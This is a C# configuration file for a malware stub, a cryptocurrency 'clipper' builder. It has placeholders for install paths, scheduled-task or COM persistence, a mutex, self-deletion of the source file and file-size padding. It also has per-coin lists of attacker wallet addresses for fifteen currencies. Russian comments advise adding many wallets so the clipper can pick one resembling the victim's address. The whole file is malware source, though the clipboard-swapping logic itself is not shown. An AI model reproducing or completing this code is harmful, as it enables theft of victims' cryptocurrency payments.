﻿using System;
using System.Collections.Generic;

namespace Stub
{
    class Config
    {
        public static bool install = Convert.ToBoolean("[INSTALL]");
        public static bool autoRun_Scheduler = Convert.ToBoolean("[RUN_SCHEDULER]");
        public static bool autoRun_COM = Convert.ToBoolean("[RUN_COM]");
        public static string sysDir = "[SYSDIR]";
        public static string dir = "[DIR]";
        public static string bin = "[BIN]";
        public static string taskName = "[TASKNAME]".Replace(" ", "_").Trim();
        public static bool sourcefileDelete = Convert.ToBoolean("[DELETE]");
        public static string MutEx = "[MUTEX]".Replace(" ", "_").Trim();
        public static bool AddBytes = Convert.ToBoolean("[ADDDBYTES]");
        public static int Addbkb = Convert.ToInt32("[ADDKB]");


        // Ваши кошельки для подмены, чем больше тем лучше.
        // Клиппер ищет самый похожий из списка по первым или последним символам.
        public static Dictionary<string, string[]> addresses = new Dictionary<string, string[]>()
        {
            // Bitcoin 1/3
           
            {"btc", "[BTC]".Trim().Split(',') }, 
            // Bitcoin bc1
            {"bc1", "[BC1]".Trim().Split(',') },
            // Ethereum
            {"eth", "[ETH]".Trim().Split(',') }, 
            // Monero
            {"xmr", "[XMR]".Trim().Split(',') },
            // Stellar
            {"xlm", "[XLM]".Trim().Split(',') }, 
            // Ripple
            {"xrp", "[XRP]".Trim().Split(',') },
            // Litecoin
            {"ltc", "[LTC]".Trim().Split(',') },
            // Neocoin
            {"nec", "[NEC]".Trim().Split(',') }, 
            // Bitcoin Cash
            {"bch", "[BCH]".Trim().Split(',') }, 
            // Dashcoin
            {"dash", "[DASH]".Trim().Split(',') },
            // Doge Coin
            {"doge", "[DOGE]".Trim().Split(',') },
            // Tron
            {"trx", "[TRX]".Trim().Split(',') },
            // Z-Cash
            {"zcash", "[ZCASH]".Trim().Split(',') },
            // Binance Coin
            {"bnb", "[BNB]".Trim().Split(',') },
            // TON Coin
            {"ton", "[TON]".Trim().Split(',') },
        };
    }
}
